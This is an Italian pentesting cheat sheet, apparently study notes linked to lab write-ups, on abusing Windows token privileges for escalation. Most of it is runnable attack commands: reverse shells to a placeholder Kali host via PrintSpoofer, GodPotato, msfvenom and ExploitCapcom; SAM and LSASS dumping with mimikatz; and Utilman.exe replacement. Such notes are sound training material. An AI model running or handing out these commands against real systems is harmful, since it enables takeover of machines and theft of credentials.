#Privesc_Windows

---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Abilita Token]]
- [[#SeImpersonatePrivilege / SeAssignTokenPrivilege]]
- [[#SeBackupPrivilege]]
- [[#SeRestorePrivilege]]
- [[#SeTakeOwnershipPrivilege]]
- [[#SeDebugPrivilege]]
	1. [[#Metodo 1 Dumping LSASS]]
	2. [[#Metodo 2 RCE come SYSTEM]]
- [[#SeLoadPrivilege]]
- [[#SeTcbPrivilege]]
- [[#SeCreateTokenPrivilege]]
- [[#SeManageVolumePrivilege]]

---
---
---
### Introduzione
I¬†**privilegi di token**¬†sono diritti specifici assegnati agli account Windows che, se abusati, possono consentire l'escalation dei privilegi. Questi privilegi sono spesso trascurati ma estremamente sfruttabili in contesti di penetration testing.

---
### Enumerazione
Per scoprire i privilegi dell'utente in possesso:

```
whoami /priv
```

Per automatizzare la scansione possiamo utilizzare [winpeas.exe](https://github.com/peass-ng/PEASS-ng/releases/tag/20250904-27f4363e): 

```
winpeas.exe quiet servicesinfo
```

 [PowerUp.ps1](https://github.com/HarmJ0y/PowerUp):
 
```
. .\PowerUp.ps1
Invoke-AllChecks
```

[AccessChk.exe](https://github.com/hansalemaos/accesschk2df):

```
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv "Authenticated Users" *
```


---
### Abilita Token
Nel caso in cui troviamo un potenziale token vulnerabile ma in modalit√† `Disable` allora possiamo provare ad abilitarlo caricando sulla macchina target [EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1):

```
Import-Module .\EnableAllTokenPrivs.ps1
```

Ora il token dovrebbe essere sfruttabile.

---
### SeImpersonatePrivilege / SeAssignTokenPrivilege
Questo privilegio permette a un processo di¬†**impersonare**¬†altri utenti dopo aver autenticato le loro credenziali. In pratica, puoi "diventare" altri utenti sul sistema, incluso SYSTEM. √à comune in service account come IIS, SQL Server, e COM+.

Carichiamo sulla macchina target [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases) ed avviamo una *reverse shell* aiutandoci con [nc.exe](https://github.com/int0x33/nc.exe/):

```
./PrintSpoofer64.exe -c "C:\Users\Public\Desktop\nc64.exe IP_KALI 5555 -e cmd"
```

Oppure utilizzando [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe):

```
JuicyPotato.exe -l LPORT_KALI -t * -p reverse.exe
```

üìö‚Äã Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Nagoya| Nagoya]],
- *Windows:*[[Windows#Bounty| Bounty]],[[Windows#Jacko| Jacko]],[[Windows#Alfred| Alfred]],[[Windows#Jeeves| Jeeves]],[[Windows#BillyBoss| BillyBoss]],[[Windows#Relevant| Relevant]],[[Windows#Job| Job]],
  
Oppure utilizzando [GodPotato.NET4.exe](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) con [nc.exe](https://github.com/int0x33/nc.exe/):
  
```
.\GodPotato-NET4.exe -cmd "C:\temp\nc64.exe <IP_KALI> <KALI_PORT> -e cmd.exe"
```

---
### SeBackupPrivilege
Concede l'accesso in¬†**lettura a tutti i file**¬†del sistema, ignorando le ACL (Access Control Lists). Permette di leggere file protetti come SAM, SYSTEM, LSA secrets, anche senza permessi tradizionali.

Nel caso il token `SeBackupPrivilege` sia abilitato allora possiamo leggere i registri SAM e SYSTEM:

```
reg save hklm\system system.hive
reg save hklm\sam sam.hive
```

Trasferirli sulla nostra kali e poi estrarre gli NTLM con:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

üìö‚Äã Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Baby| Baby]],[[üìö WRITEUPS/üåç Ambienti/Active Directory#Hokkaido| Hokkaido]],

---
### SeRestorePrivilege
Permette di **scrivere su qualsiasi file del sistema**, ignorando le ACL. Pu√≤ essere usato per sostituire eseguibili di sistema o modificare configurazioni critiche.

Spesso l'attacco consiste nel sostituire il file `Utilman.exe` con `cmd.exe`, poich√© il primo file √® avviato durante la fase di login:

```
copy cmd.exe C:\Windows\System32\utilman.exe
```

Una volta effettuato l'accesso, premere `CTRL+U` per avviare una shell come amministratore.

üìö‚Äã Writeups:
- *Active Directory:*[[üìö WRITEUPS/üåç Ambienti/Active Directory#Vault| Vault]],

---
### SeTakeOwnershipPrivilege
Permette di¬†**diventare proprietario**¬†di qualsiasi oggetto del sistema (file, registry key, processi). Una volta proprietario, puoi modificare i permessi e ottenere controllo completo.

Usa `takeown` per diventare proprietario di un file o directory. Nell'esempio di seguito applicheremo il comando sul file `Utilman.exe` ma √® applicabile su qualsiasi altra risorsa:

```
takeown /f C:\Windows\System32\Utilman.exe
```

Modifica i permessi del file in `Full`:

```
icacls C:\Windows\System32\Utilman.exe /grant <USERNAME>:F
```

Infine rimpiazza `Utilman.exe` con `cmd.exe`:

```
copy cmd.exe C:\Windows\System32\utilman.exe
```

---
### SeDebugPrivilege
Permette di¬†**debuggare e modificare la memoria**¬†di processi appartenenti ad altri utenti, incluso SYSTEM.

#### Metodo 1: Dumping LSASS
Utilizzando [procdump.exe]() possiamo scaricare file di gestione credenziali come[[üî° Glossario#LSASS| LSASS¬∞]]:

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Poi analizziamolo con [mimikatz.exe](https://github.com/ParrotSec/mimikatz):

```
mimikatz # sekurlsa::minidump lsass.dmp  #Carica il file lsass.dmp
mimikatz # sekurlsa::logonpasswords      #Estrae le credenziali
```

#### Metodo 2: RCE come SYSTEM
L'idea di base √® quella di avviare un processo figlio che **eredita il token del processo padre**, che √® in esecuzione con privilegi di SYSTEM. 

Innanzitutto identifichiamo un processo in esecuzione avviato come SYSTEM e copiamone il *PID*:

```
tasklist
```

Poi carichiamo sulla macchina target [psgetsys.ps1](https://github.com/decoder-it/psgetsystem) ed avviamolo:

```
. .\psgetsys.ps1
```

Adesso lanciamo il comando per impersonare l'utente SYSTEM specificando il *PID* trovato poc'anzi:√π

```
ImpersonateFromParentPid -ppid <PID> -command <COMMAND> -cmdargs ""
```

---
### SeLoadPrivilege
Permette di¬†**caricare e scaricare driver di dispositivo**¬†a livello kernel. I driver kernel hanno privilegi illimitati, quindi caricare un driver vulnerabile pu√≤ portare a escalation completa.

Se il token √® presente ma √® disabilitato allora abilitiamo con [eoploaddriver_x64.exe](https://github.com/k4sth4/SeLoadDriverPrivilege) :

```
.\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys
```

Una volta abilitato il token, carichiamo sulla macchina target il kernel driver vulnerabile [Capcom.sys](https://github.com/k4sth4/SeLoadDriverPrivilege) ed avviamolo con [ExploitCapcom.exe](https://github.com/k4sth4/SeLoadDriverPrivilege):

```
.\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
```

Adesso possiamo eseguire comandi:

```
.\ExploitCapcom.exe EXPLOIT whoami
```

o avviare *reverse shell:*

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > shell.exe
.\ExploitCapcom.exe EXPLOIT shell.exe
```

---
### SeTcbPrivilege
Identifica il possessore come parte del "Trusted Computing Base" (il nucleo sicuro di Windows). Concede effettivamente tutti i privilegi del sistema.

Carichiamo sulla macchian target [TcbElevation.cpp](https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178) e [rcat.exe](https://github.com/xct/rcat). Poi avviamo una *reverse shell* con:

```
.\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c rcat.exe"
```

---
### SeCreateTokenPrivilege
Permette di¬†**creare nuovi token di accesso**¬†arbitrari. Puoi creare un token per qualsiasi utente, incluso SYSTEM, e associarlo a un processo.

> [!warning]
> Non documentato 

---
### SeManageVolumePrivilege
Permette operazioni di¬†**manutenzione su volumi**¬†come deframmentazione, che pu√≤ essere sfruttata per accedere a dati normalmente protetti.

Creiamo una *reverse shell* con `msfvenom` e carichiamola sulla macchina target:

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=4545 -f dll -o shell.dll
```

Carichiamo sulla macchina target [SeManageVolumeExploit.exe](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) ed eseguiamo la reverse shell appena creata:

```
.\SeManageVolumeExploit.exe
C:\Windows\System32\wbem\shell.dll
```
